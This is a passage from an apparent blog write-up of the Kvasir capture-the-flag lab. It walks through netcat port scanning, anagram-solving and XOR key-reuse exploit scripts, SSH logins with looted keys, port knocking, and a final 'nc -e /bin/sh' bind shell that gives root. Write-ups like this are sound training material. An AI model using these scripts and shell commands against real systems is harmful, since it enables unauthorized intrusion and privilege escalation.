root@kali:~/data/scripts/stepic-0.3# echo "89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec9054422304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae555e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88df9bb4ae0a3dc20000000049454e44ae426082" | xxd -p -r > out
root@kali:~/data/scripts/stepic-0.3# file out 
out: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
```

Another image file! It's actually a QR code.

![QR](/images/posts/2014-11-05-kvasir-vm-writeup/qr.png "QR")

I passed it on to [Online Barcode Reader](http://www.onlinebarcodereader.com/) and got the following text ```Nk9yY31hva8q```. Not sure what it's for, may be some kind of password, let's hold on to it for now.


Solving anagrams
----------------

Having poked around a bit more on ```celes```, I couldn't find anything interesting and it wasn't dual homed. One thing we haven't looked at yet is the other server - ```terra``` (192.168.3.50).

Since we're looking at 192.168.3.0 subnet, that means that we would need to double-pivot from our Kali to do a port scan. While I tried that with metasploit, it was failing pretty badly (meterpreters kept crashing). We could put nmap on db server, but meh, I've crafted my own, very simple portscanner.

```
root@db:~# for i in {1..65535}; do nc -z 192.168.3.50 $i; if [ $? -eq 0 ]; then echo "Port $i listening" >> results; fi; done
root@db:~# cat results 
Port 4444 listening
```

Awesome, let's see what it is.

```
root@db:~# nc 192.168.3.50 4444
Hello Celes & Welcome to the Jumble!

Solve:ogsdioclpe 
Solve:oagichrlogp 
Solve:snelrgiermo ^C
```

Solving jumbles... great. I tried couple typical buffer overflow things etc., but none of them worked. I guess we'll need to script up anagram solver.

Also, which dictionary should we use... after a bit of playing around with that jumble it seemed like there were couple known usernames from #vulnhub. And remember that words.txt file we looted earlier on? It was exactly it! Let's us that and code it all up.

{% codeblock lang:python %}
#!/usr/bin/python

import socket

# dictionary
wordlist=open("words.txt","r")

# Open socket and retrieve welcome message
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.3.50", 4444))
sock.recv(38)

# Keep getting data until socket closes
while True:
    # Read data from the server
    data = sock.recv(5120)

    # Get the word to decode and strip out spaces and new line
    phrase = data[6:].rstrip()
    print "Phrase = " + phrase

    # Rewind the file back to start
    wordlist.seek(0);

    # Go through each line in the wordlist and try to find a match
    for line in wordlist:
        found_match = True      
        answer = "n/a"

        # Remove whitespaces and new lines from dictionary word
        word = line.rstrip()

        # Start investigating phrase only if it has the same length as selected word from dictionary
        if len(phrase) == len(word):
            # Go through every letter in the phrase and check number of its occurrences against dictionary word,
            # if it matches number of occurences of the letter in the phrase, move on to the next letter.
            # As soon as it fails, don't bother investigating the word further
            for i in range(len(phrase)):
                if phrase.count(phrase[i]) != word.count(phrase[i]):
                    found_match = False
                    break;
            if found_match:
                answer = word;
                break;

    print "Answer = " + answer

    # Send answer to the server
    sock.send(answer);
{% endcodeblock %}

It's actually really quick to run and we get another element in the puzzle.

```
root@db:~# ./anagram-socket.py 
Phrase = itaingdhs
Answer = gandhiist
Phrase = aifieinvuacqotolr
Answer = overqualification
Phrase = gorypcueshsry
Answer = psychosurgery

(...truncated...)

Phrase = iidvaeart
Answer = radiative
Phrase = bloiblhimpisi
Answer = bibliophilism
Phrase = hvnaci
Answer = chavin
Phrase = rabbsrae
Answer = barrebas
Phrase = : 120
Time: 0.02 secs
You're a winner
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBBRVMtMTI4LUNCQyw3Njg0MTgyMkFCOUU3NzJGRDFENjUzRjYxNzlGMEU0RAoKT3JFTTJvY25oSEtnNW51SDdwczFDb09KQ2loYXNtRkpLTE9WTk5ZRk9oR0tVb2pQWUV0YTV5T2hJc2tmMGgwcgpTbyt4VkRLNjdHM0RsZ3ltVVYzRHhHZml6TGZadmh4UVJDOFF5MG1mNE4rbWlZa3ZmMk5hRnRhdHBOY2pLNXBNClV5NlFTRk1PQzhhS3BlMEZMNlVHRFJKUTVHU0c0RGxKckxVSkJNdm5TTHRZWkhsYVdBSUNLYlhmcFhWNFNUd3YKSjBEOGg5UnRsUkpoTENLNWVLZ3VwWUNRSWlHUVdnM1B2WnBYazlra2pYaG1PUXdVWW9DUmwzbDRqNXpsbkZjVApQNlU5VVBoUnEvQ2s0UXJrMmRHeEZmcHBRZDl4VytiNFBXamlTQ2lrTEYzUTBoZk5OdkVidTRvdW5BZ1l3UEZICmpPWEhKcXhWb2cvcFp6OVk4WGZTUDNoejlBWUhXZkkyaUM5Q25rN2JvUmNPdittY2dFZVdXa1lyVnNjT2l2WWoKOU4yeGlOcDRHSCtOSUc4bW0vTGRsN2pRTWwvVnJyNWN4M2ZYak9lem1nc1NrQVk0Q2NzcHdLc1NYSzhHTC9iTwpoVDZwS1dmTDZVSTh3VWdwSTdLaGdLK0FPS3VTL1hQWVRTZHorMFJKeE5GU0xPRk5jalJ0TCtOVzBValBxNUpoCkRpYStwdzVxQitsbGx4Z2FOMFdCUXNrSUZRcHBwUG93d2pHOEpnOGpKQmpTWWozcjRMSXJad0pTcGN2b0JpVUEKb0NxblFVTXRYbE1oOS9DdkJCR3MxK0pWY2prSW5CZGU5NDVWK2VqaFA2R1BZanU0VFFWN0I3MGQ3YUVXME9FbQowZDduck9XL0xDWXBzVi9ONXJxVnNHbFR2d2pKTm93eU1xRVo5RTA5Z3VNNWVMNENFUFBtcDlaRGV5MmZCQUd3CnE3blNyOHE2SHNmNGQrWVBSKzkwRWZNSlJlcUkzczFGUW9UdngrUGFGUGlLdzdkZkhGQ2dMc2NYY1hjb2duTHoKY0IwbG5lbUkrY0ZtZlk3NEYxZVlMM2Z3Skl3U1JnSzg1WGMyTXk4c3FKejFpemo2SWxPMmtRMWpMa3JoSk9aOApYK3AvOXc1ekEweDJmYmpwcEhhYytZb0pmeVB5WVhqa3BpZ0RQakhYaFJpdDJxblVySGZEYzBGamg1QUtOVTJLCk1VL3l3WEdFZzZ3MENwcEs5SkJvMHUveEpsaFQvak9XTmlNNFlaalhsaFF6a3h5ZWJ2YnlSUzZTbGhsbzE0MmwKZ011TVV2UG4xZkFlbmlyNkFGd3kycmxrdFE1L2E4ejJWQ3dQa05BNDBNSW1TSE1XUlNGYm9Eak01endyMjRHawpOMHBJMUJDbUNzZjBtc3ZFd0xoZGNWbmhKWTdCZzRpem01YlgrQXJWL3ltTE9reWJLOGNoejVmcnlYY2plVjFxCml6SmUyQVhaazEvOGhZODB0dkpXanhVRWZuZ3V5b296UWY1VDc0bW41YWV6OUpnR1dNcXpwZkt3WjZMeDVjVGcKWnUrbStyeWFrQlBGalV0dDA0bENZQ0NLV1F6UGhnSXI1eFVGeDYyaENHaGg2Vzh0U0lCNms3SHB1bjEyM0dRMAp1VCtSMEVyWUE1R2R5eDQ0RlpFYXRaM3JYQ3BWbUpsbENUV1VxQnVhSFlBdGNaVGhUVFpmeFJGSHkwMklUNkZXClBMQ1ovWE4yRStUZHRrWG1GY1RYUnNndHlBLzVWWHNUV1dtUmNIY3p2NWc1WWNRM3BIczNNaFN4c1dTZFR6LzgKUll6bXhPbkNqWldYYVVlMFhiN0ZqQS9ldm1wWHN5aENoR2J2cDBLMGhaRmNNZXN6RkthOEs0cEFlZGN5RzMxbgo0K0hoSW1uRXBMWlFPWGhmWGxrS01RWHJCeXM3aGtvbmtEcDU3VnFoK0lJWkxHelZtZlRWRWoyV2hjLzBZK0dJCkRNcGgwWnZURytKZ3YxTE8zU2w4MlJ6bTFqVWt6RUlaTkl4WWVTR3JaZjZDaFZMUGE4NWF4cXc1RVZOQ3hZVWcKSkFxZyt1ZDZ4SU85b2JpZHh6STJyTGZieGNwTXVyODBuYjRjcllNTm0wOXlQUWFza25nSy80SWptblBMZVRpaAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```

When we ```base64 -d``` the output, we get the following RSA key.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D

OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
-----END RSA PRIVATE KEY-----
```

Awesome, let's use this to connect in as ```terra```.

```
root@db:~# ssh terra@192.168.3.50 -i terra.id
Enter passphrase for key 'terra.id':
```

Passphrase? Let's try ```Nk9yY31hva8q``` from the QR code.

```
root@db:~# ssh terra@192.168.3.50 -i terra.id
Enter passphrase for key 'terra.id': 
Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Tue Nov  4 17:51:12 2014 from 192.168.3.200
terra@dev2:~$
```

Aaaand we're in!


Port knocking 
-------------

First thing you notice, there's some mail to read. Let's disregard privacy and see what's in there.

```
terra@dev2:~$ cat /var/mail/terra 
Return-path: <locke@192.168.4.100>
Received: from locke by 192.168.4.100 with local (Exim 4.80)
~       (envelope-from <locke@adm>)
~       id 1XHczw-0000V2-8y
~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100

Date: Wed, 13 Aug 2014 19:10:08 +0100
To: terra@192.168.3.50
Subject: Port Knock
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: <E1XHczw-0000V2-8y@adm>
From: locke@192.168.4.100
~
Hi Terra,

I've been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
Let me know how it goes.

Regards,
Locke
```

Okay, looks like port knocking is enabled on ```locke```. But, what's the sequence, what's ```locke```'s IP address and what other ports are open?

We can see that ```terra``` is dual-homed, so most likely, ```locke``` is going to be in 192.168.4.0 subnet.

```
terra@dev2:~$ /sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 16:90:14:17:19:17  
          inet addr:192.168.3.50  Bcast:192.168.3.255  Mask:255.255.255.0
          inet6 addr: fe80::1490:14ff:fe17:1917/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:149577 errors:0 dropped:0 overruns:0 frame:0
          TX packets:162327 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:11573196 (11.0 MiB)  TX bytes:17903327 (17.0 MiB)

eth1      Link encap:Ethernet  HWaddr da:9e:bf:d1:a2:e6  
          inet addr:192.168.4.50  Bcast:192.168.4.255  Mask:255.255.255.0
          inet6 addr: fe80::d89e:bfff:fed1:a2e6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:126211 errors:0 dropped:0 overruns:0 frame:0
          TX packets:97379 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:18689553 (17.8 MiB)  TX bytes:7391653 (7.0 MiB)

(...)
```

First, let's use my homemade scanner to see what IP addresses are in the range.

```
terra@dev2:~$ for i in {1..254}; do ping -c 1 -w 1 192.168.4.$i | grep "1 received" -B 1; done
^C
--- 192.168.4.50 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
--- 192.168.4.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
^C
```

Looks like 192.168.4.100 is the one we should be interested in. Let's see what ports are opened.

```
terra@dev2:~$ for i in {1..65535}; do nc -z 192.168.4.100 $i; if [ $? -eq 0 ]; then echo "Port $i listening" >> results; fi; done
terra@dev2:~$ cat results 
Port 22 listening
```

Okay... port 22 opened, but we don't have a password/key... maybe port knocking will open more ports? But what's the sequence? Let's try some defaults - maybe 7000, 8000, 9000 ([knockd](http://www.zeroflux.org/projects/knock/) defaults).

```
terra@dev2:~$ nc 192.168.4.100 7000
(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
terra@dev2:~$ nc 192.168.4.100 8000
(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
terra@dev2:~$ nc 192.168.4.100 9000
(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
terra@dev2:~$ for i in {1..65535}; do nc -z 192.168.4.100 $i; if [ $? -eq 0 ]; then echo "Port $i listening" >> results; fi; done
terra@dev2:~$ cat results 
Port 22 listening
Port 1111 listening
```

Ha, awesome! Default sequence seemed to work, now we have another port opened. Let's connect to it.

```
terra@dev2:~$ nc 192.168.4.100 1111
whoami
locke
```

Shell!!!! Quickly generated new keys and dropped them under locke's ```.ssh``` dir. Let's connect via normal SSH.

```
terra@dev2:~$ ssh locke@192.168.4.100 -i keys/locke.id
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov  4 17:51:13 2014 from 192.168.4.50
locke@adm:~$
```


A little bit of forensics
-------------------------

After some poking around, we can see that this server is not dual-homed (finally!), so I think this could be our final machine!

Also, there's another user - ```kefka```, I guess that's the one we'll need to get our privilege escalation from. But first, we need to get access to that account.

First thing that stands out is ```note.txt``` file and ```diskimage.tar.gz```.

```
locke@adm:~$ cat note.txt 
Looks like Kefka may have been abusing our removable media policy.  I've extracted this image to have a look.
```

Cool, let's get diskimage file, extract it and see what it's all about (again, ```scp``` it all the way back to our Kali).

```
root@kali:~# file diskimage 
diskimage: x86 boot sector, code offset 0x3c, OEM-ID "MSDOS5.0", sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes > 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit)
root@kali:~# mount diskimage /mnt
root@kali:~# cd /mnt/
root@kali:/mnt# ls
total 21
drwxr-xr-x  2 root root 16384 Jan  1  1970 .
drwxr-xr-x 22 root root  4096 Oct 12 12:26 ..
-rwxr-xr-x  1 root root   118 Aug  3 11:10 Secret.rar
root@kali:/mnt# unrar x Secret.rar 

UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal


Extracting from Secret.rar

Enter password (will not be echoed) for MyPassword.txt: 

Extracting  MyPassword.txt                                            44%
CRC failed in the encrypted file MyPassword.txt. Corrupt file or wrong password.
Total errors: 1
```

So I've mounted the image, but can only see one file that is encrypted! And again, I don't have a password. Ahhh, did I miss something on the way? What made me suspicious though was the size of the diskimage file, it's like 60MB, while ```Secret.rar``` is merely a hundred bytes. There must be something else!

I reached out to a simple, extremely useful tool for extracting data from images - ```foremost```. It'll extract all the files it can find (even deleted ones) from a provided image. Let's have a look what we can get here.

```
root@kali:~# foremost -i diskimage 
Processing: diskimage
|*|
root@kali:~# cd output/
root@kali:~/output# ls
total 20
drwxr-xr--  4 root root 4096 Nov  6 11:50 .
drwxr-xr-x 27 root root 4096 Nov  6 11:50 ..
-rw-r--r--  1 root root  729 Nov  6 11:50 audit.txt
drwxr-xr--  2 root root 4096 Nov  6 11:50 rar
drwxr-xr--  2 root root 4096 Nov  6 11:50 wav
root@kali:~/output# cd wav/
root@kali:~/output/wav# ls
total 440
drwxr-xr-- 2 root root   4096 Nov  6 11:50 .
drwxr-xr-- 4 root root   4096 Nov  6 11:50 ..
-rw-r--r-- 1 root root 440480 Nov  6 11:50 00000514.wav
```

Cool, we found a wav file!

Unfortunately, it doesn't sound like anything useful at all... ```strings``` didn't return anything useful on it either. I did a bit of a research into hiding data in wav files, but there is variety of different tools and yet no hints about which one may have been used. But then got that idea... let's see "how does the sound look like".

I've downloaded [SonicVisualiser](http://www.sonicvisualiser.org/index.html) and opened up spectogram of the wav file.

![Spectogram](/images/posts/2014-11-05-kvasir-vm-writeup/spectogram.png "Spectogram")

Whoop, whoop! That's our password to the rar!

```
root@kali:~/output/rar# unrar x 00000512.rar 

UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal


Extracting from 00000512.rar

Enter password (will not be echoed) for MyPassword.txt: 

Extracting  MyPassword.txt                                            OK 
All OK
root@kali:~/output/rar# cat MyPassword.txt 
5224XbG5ki2C
```

Key reuse
---------

Using found password ```5224XbG5ki2C``` we can log-in as ```kefka```.

```
locke@adm:~$ su - kefka
Password: 
kefka@adm:~$ sudo -l
Matching Defaults entries for kefka on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kefka may run the following commands on this host:
    (ALL) NOPASSWD: /opt/wep2.py
```

And quickly see that we'll need to do our privilege escalation via ```/opt/wep2.py``` script.

So what does it actually do? It opens up local port 1234 and listens for connections. When you connect to it, it offers to provide you an encrypted flag and also encrypts input of your choice.

```
kefka@adm:~$ sudo /opt/wep2.py &
[1] 2817
kefka@adm:~$ nc localhost 1234
=============================
Can you retrieve my secret..?
=============================

Usage:
'V' to view the encrypted flag
'E' to encrypt a plaintext string (e.g. 'E AAAA')

V
1e6115:09f6e8ef07010490172cdbb2
V
a54afe:9c82be3f9bdecf8e426c91d8
V
4c1261:57630397f8dbad94c02c0a45
E A
853283:cd
E A
acfd3c:93

```

Quickly we can observe couple things:

* encrypted text is always different
* different keys are used each time (hence the above)
* output strings are hex representations of encoded string
* used key is pretty small

Also, name of the script suggests WEP encryption... or at least that it's as bad as WEP :)

After a bit of research, we can craft our attack using key reuse. Few words on how it works.

Because of the way XOR works, some weak ciphers are vunerable to key reuse attack if the same key is reused. As long as you know the plaintext of one encrypted message and it's key, if you find another, unknown message encoded with the same key, you will be able to extract its plaintext. Let's look at the following:

 ```encrypted_messageA``` = ```messageA``` XOR ```key```

 ```encrypted_messageB``` = ```messageB``` XOR ```key```

What happens if we XOR both of them together? Remember that ```abc XOR abc = 0```!

 ```encrypted_messageA XOR encrypted_messageB = messageA XOR key XOR messageB XOR key = messageA XOR messageB```

Keys disappeared, because ```key XOR key = 0```.

Now assume we know plaintext of ```messageA``` and want to find ```messageB```. All we need to do is get rid of known ```messageA``` from the equation by XORing the whole thing with ```messageA```.

 ```messageA XOR messageB XOR messageA = messageB```

Again, because ```messageA XOR messageA = 0```.

*Some really good resources that helped me with understanding the concept:*

* [http://b.cryptosmith.com/2008/05/31/stream-reuse/](http://b.cryptosmith.com/2008/05/31/stream-reuse/)
* [http://en.wikipedia.org/wiki/Stream_cipher_attack](http://en.wikipedia.org/wiki/Stream_cipher_attack)

So, knowing what needs to be done, I've crafted below script to quickly get our plaintext flag.

{% codeblock lang:python %}
#!/usr/bin/python

import socket

# XOR strings function definition (ensure to pass in binary values)
#
def xor_strings(p_string1, p_string2):
    return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(p_string1, p_string2))

# Initialise socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 1234))

# Get banner and instructions
sock.recv(200)

# Random, known message of the same length as the flag
# to be used later for XOR operations
message = "A" * 12

# Collections of encrypted flags and messages
flags = {}
messages = {}

while True:
    # Build a list of known encrypted flags
    sock.send("V\n")
    encrypted_flag = sock.recv(200).strip()
    flag_key = encrypted_flag[:6]
    flag_value = encrypted_flag[7:]
    flags[flag_key] = flag_value

    # Build a list of known encrypted messages
    sock.send("E " + message + "\n")
    encrypted_message = sock.recv(200).strip()
    message_key = encrypted_message[:6]
    message_value = encrypted_message[7:]
    messages[message_key] = message_value

    # Find the flag key in message keys or vice versa
    # (since we're building 2 lists, check both - should
    # be able to find a match quicker)
    if flag_key in messages:
        message_value = messages[flag_key]
        break

    if message_key in flags:
        flag_value = flags[message_key]
        break

# Values are returned in hex form, so need to convert it back
# to binary for XOR
binary_message = message_value.decode("hex")
binary_flag = flag_value.decode("hex")

# XOR both encryptions together
# encrypted_message XOR encrypted_flag = message XOR key XOR flag XOR key
xor_both_result = xor_strings(binary_message, binary_flag)

# XOR above rsult with plaintext message to get the flag, because:
# key XOR key = 0; and
# message XOR message = 0; therefore:
# message XOR key XOR flag XOR key XOR message = flag
decoded_flag = xor_strings(xor_both_result, message)

print decoded_flag

sock.close()

{% endcodeblock %}

Let's exploit it!

```
kefka@adm:~$ sudo /opt/wep2.py &
[1] 2824
kefka@adm:~$ ./exp.py 
0W6U6vwG4W1V
```

Wow, that was actually *really* quick (way less than 1s)... that's our plaintext flag! But is that it? We need a root shell! I tried using it as a root password, but didn't work. Tried few other things, tried to find other privilege escalation points, but no luck.

Finally, I decided to put it in as input in the program we just exploited.

```
=============================
Can you retrieve my secret..?
=============================

Usage:
'V' to view the encrypted flag
'E' to encrypt a plaintext string (e.g. 'E AAAA')

0W6U6vwG4W1V
> ls
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
> print "A"
A
```

Python shell? Wow, ok, let's create real shell!

```
> import os; os.system("nc -e /bin/sh -l -p 31337")
^C
kefka@adm:~$ nc localhost 31337
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag
cat flag
    _  __                             _            
   | |/ /   __ __   __ _     ___     (_)      _ _  
   | ' <    \ I /  / _` |   (_-<     | |     | '_| 
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax 
gur Zrnq bs Cbrgel...

Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.

Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.

  enfgn_zbhfr(@_EnfgnZbhfr)
```

Even the flag is messed up... ROT-13 :)

```
cat flag | tr 'n-za-mN-ZA-M' 'a-zA-Z'
    _  __                             _            
   | |/ /   __ __   __ _     ___     (_)      _ _  
   | ' <    \ V /  / _` |   (_-<     | |     | '_| 
   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 

Congratulations on beating Kvasir - I hope you enjoyed
the ride.  Take his blood, mix with honey and drink 
the Mead of Poetry...

Big shout out to my beta testers: @barrebas and @TheColonial.
Special thanks to Bas for his patience during this endeavour.

Feel free to ping me with thoughts/comments on
http://wi-fu.co.uk, #VulnHub IRC or Twitter.

  rasta_mouse(@_RastaMouse)

```

Summary
-------

Awesome challenge! Spent quite a lot of hours (on and off) working on it, I liked the multi-layered design of it and how it touched on quite a lot of aspects of security! Also I managed to brush up on some of the forensics skills and learnt something new about key reuse :) Great job building it up [Rasta Mouse](https://twitter.com/_RastaMouse)!
